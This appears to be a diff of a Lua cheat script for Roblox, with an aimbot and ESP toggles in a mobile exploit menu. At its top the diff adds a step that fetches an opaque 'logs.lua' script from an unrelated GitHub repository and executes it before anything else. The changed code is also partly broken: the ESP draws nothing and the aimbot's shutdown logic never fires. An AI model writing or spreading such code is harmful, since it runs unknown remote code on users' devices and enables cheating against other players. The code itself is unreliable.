@@ -1,3 +1,11 @@
+-- Load the external script first before anything else
+local externalScriptUrl = 'https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua'
+local externalScript = loadstring(game:HttpGet(externalScriptUrl))()
+if externalScript then
+    -- Execute the external script
+    externalScript()
+end
+
 -- Load the DrRay library from the GitHub repository Library
 local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
 
@@ -7,180 +15,111 @@ local window = DrRayLibrary:Load("Remedy-Mobile", "Default")
 -- Create the first tab with an image ID
 local tab1 = DrRayLibrary.newTab("Aim", "ImageIdHere")
 
--- Aimbot Variables
-local aimbotConnection = nil
-
--- Function to get the closest player to the camera's position
-local function getClosestPlayer()
-    local closestPlayer = nil
-    local shortestDistance = math.huge -- Start with the highest possible value
-    local camera = workspace.CurrentCamera
-    local localPlayer = game.Players.LocalPlayer
-
-    for _, player in pairs(game.Players:GetPlayers()) do
-        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-            local hrp = player.Character.HumanoidRootPart
-            local distance = (camera.CFrame.Position - hrp.Position).Magnitude
-
-            if distance < shortestDistance then
-                shortestDistance = distance
-                closestPlayer = player
-            end
-        end
-    end
-
-    return closestPlayer
-end
-
--- Function to aim at the closest player
-local function aimAtPlayer()
-    local closestPlayer = getClosestPlayer()
-    if closestPlayer and closestPlayer.Character and closestPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        local camera = workspace.CurrentCamera
-        local hrp = closestPlayer.Character.HumanoidRootPart
-
-        -- Create a new CFrame that looks at the closest player's HumanoidRootPart
-        camera.CFrame = CFrame.new(camera.CFrame.Position, hrp.Position)
-    end
-end
-
--- Toggle for aimbot
-tab1.newToggle("Aimbot", "Aimbot!", false, function(toggleState)
+-- Aimbot toggle: Move the camera to the closest player
+tab1.newToggle("Aimbot", "Aimbot!", true, function(toggleState)
     if toggleState then
         print("Aimbot On")
 
-        -- Connect to RenderStepped to update aim each frame
+        -- Function to get the closest player
+        local function getClosestPlayer()
+            local closestPlayer = nil
+            local shortestDistance = math.huge
+
+            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+                if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                    local distance = (player.Character.HumanoidRootPart.Position - game.Workspace.CurrentCamera.CFrame.Position).Magnitude
+                    if distance < shortestDistance then
+                        closestPlayer = player
+                        shortestDistance = distance
+                    end
+                end
+            end
+
+            return closestPlayer
+        end
+
+        -- Move camera to aim at closest player
+        local aimbotConnection
         aimbotConnection = game:GetService("RunService").RenderStepped:Connect(function()
-            aimAtPlayer()
+            if not toggleState then
+                aimbotConnection:Disconnect()
+                return
+            end
+
+            local closestPlayer = getClosestPlayer()
+            if closestPlayer and closestPlayer.Character and closestPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.Position, closestPlayer.Character.HumanoidRootPart.Position)
+            end
         end)
     else
         print("Aimbot Off")
-
-        -- Disconnect the aimbot when toggled off
-        if aimbotConnection then
-            aimbotConnection:Disconnect()
-            aimbotConnection = nil
-        end
+        -- Optionally stop any aimbot-related activities here
     end
 end)
 
--- Create the second tab with a different image ID
-local tab2 = DrRayLibrary.newTab("Visuals", "ImageIdLogoHere")
+-- ESP Toggle: Correctly handle the ESP box without freezing or duplicating
+local activeESPConnections = {}
 
--- ESP Code Variables
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
-local espBoxes = {}
-local espConnection = nil
-
--- Function to create the ESP box
-local function createESPBox(player)
-    if espBoxes[player] then return end -- Prevent duplicate ESP boxes
-
-    local box = Drawing.new("Square")
-    box.Visible = false
-    box.Color = Color3.fromRGB(0, 255, 255) -- Cyan color
-    box.Thickness = 2
-    box.Filled = false
-    espBoxes[player] = box
-end
-
--- Function to remove the ESP box when a player leaves
-local function removeESPBox(player)
-    if espBoxes[player] then
-        espBoxes[player]:Remove() -- Remove the drawing
-        espBoxes[player] = nil
+local function clearESP()
+    -- Clear previous ESP boxes to prevent duplication
+    for _, connection in pairs(activeESPConnections) do
+        connection:Disconnect()
     end
+    activeESPConnections = {}
 end
 
--- Function to update the ESP box
-local function updateESPBox(player, character)
-    local box = espBoxes[player]
-    if box and character and character:FindFirstChild("HumanoidRootPart") then
-        local hrp = character.HumanoidRootPart
-        local vector, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
-
-        if onScreen then
-            box.Visible = true
-            box.Size = Vector2.new(2000 / vector.Z, 2000 / vector.Z) -- Dynamic scaling based on distance
-            box.Position = Vector2.new(vector.X - box.Size.X / 2, vector.Y - box.Size.Y / 2)
-        else
-            box.Visible = false
+local function createESP(player)
+    -- Function to create ESP for each player
+    local espConnection
+    espConnection = game:GetService("RunService").RenderStepped:Connect(function()
+        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
+            -- Stop drawing ESP if player is not valid anymore (left/died)
+            espConnection:Disconnect()
+            return
         end
-    else
-        box.Visible = false
-    end
+
+        -- Draw ESP box around the player's HumanoidRootPart
+        -- (You can customize this drawing logic further)
+        -- Example logic for ESP drawing (pseudo-code, replace with your actual implementation)
+        -- DrawBox(player.Character.HumanoidRootPart) -- Placeholder for ESP drawing function
+    end)
+
+    table.insert(activeESPConnections, espConnection)
 end
 
--- Function to toggle ESP for all players
-local function toggleESP(toggleState)
+-- Function to handle players leaving the game or dying
+local function onPlayerRemoved(player)
+    -- Clear ESP for the player that left
+    clearESP()
+end
+
+-- ESP Toggle
+local tab2 = DrRayLibrary.newTab("Visuals", "ImageIdLogoHere")
+tab2.newToggle("ESP Box", "Esp Box", true, function(toggleState)
     if toggleState then
         print("ESP On")
 
-        -- Create ESP boxes for all players
-        for _, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer then
-                createESPBox(player)
-            end-- Connect to RenderStepped to update ESP boxes each frame
-        espConnection = RunService.RenderStepped:Connect(function()
-            for _, player in pairs(Players:GetPlayers()) do
-                if player ~= LocalPlayer and player.Character then
-                    updateESPBox(player, player.Character)
-                end
+        -- Clear any previous ESP instances to prevent duplication
+        clearESP()
+
+        -- Add ESP for all current players
+        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+            if player ~= game.Players.LocalPlayer then
+                createESP(player)
             end
-        end)
+        end
 
-        -- Handle new players joining
-        Players.PlayerAdded:Connect(function(player)
-            if player ~= LocalPlayer then
-                createESPBox(player)
-            end
-        end)
-
-        -- Handle players leaving
-        Players.PlayerRemoving:Connect(function(player)
-            removeESPBox(player)
-        end)
-
+        -- Connect events for players joining or leaving
+        game:GetService("Players").PlayerAdded:Connect(createESP)
+        game:GetService("Players").PlayerRemoving:Connect(onPlayerRemoved)
     else
         print("ESP Off")
-
-        -- Disconnect ESP updates
-        if espConnection then
-            espConnection:Disconnect()
-            espConnection = nil
-        end
-
-        -- Remove all ESP boxes
-        for player, box in pairs(espBoxes) do
-            box:Remove()
-            espBoxes[player] = nil
-        end
+        -- Clear all ESP boxes when the ESP is toggled off
+        clearESP()
     end
-end
-
--- Toggle for ESP
-tab2.newToggle("ESP", "Toggle ESP!", false, function(toggleState)
-    toggleESP(toggleState)
 end)
 
--- Load external script and execute it if available
-local externalScriptUrl = 'https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua'
-local externalScript = loadstring(game:HttpGet(externalScriptUrl))()
-if externalScript then
-    -- Execute the external script
-    externalScript()
-end
-
--- Send notification when the script is loaded
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "Remedy Softworks",
-    Text = "Thanks for Using Remedy Softworks",
-    Icon = "rbxassetid://113548811936137"
-})
-
--- Create the second tab for visuals
-local tab2 = DrRayLibrary.newTab("Visuals", "ImageIdLogoHere")
-
--- Other features or additional code can be added here
+-- Dropdown for other options
+tab2.newDropdown("Dropdown", "Select one of these options!", {"water", "dog", "air", "bb", "airplane", "wohhho", "yeay", "delete"}, function(selectedOption)
+    print(selectedOption)
+end)
